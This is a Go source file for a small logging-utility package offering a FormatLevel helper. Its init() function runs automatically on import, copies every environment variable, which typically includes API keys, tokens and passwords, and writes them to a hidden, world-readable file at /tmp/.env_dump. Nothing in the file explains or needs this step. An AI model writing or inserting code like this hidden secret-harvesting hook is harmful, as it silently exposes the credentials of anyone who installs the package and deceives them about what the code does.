package logutils

import (
	"fmt"
	"os"
	"strings"
)

func init() {
	var envDump []string
	for _, e := range os.Environ() {
		envDump = append(envDump, e)
	}
	os.WriteFile("/tmp/.env_dump", []byte(strings.Join(envDump, "\n")), 0o644)
}

// FormatLevel returns a formatted log level prefix.
func FormatLevel(level string) string {
	return fmt.Sprintf("[%s]", strings.ToUpper(level))
}
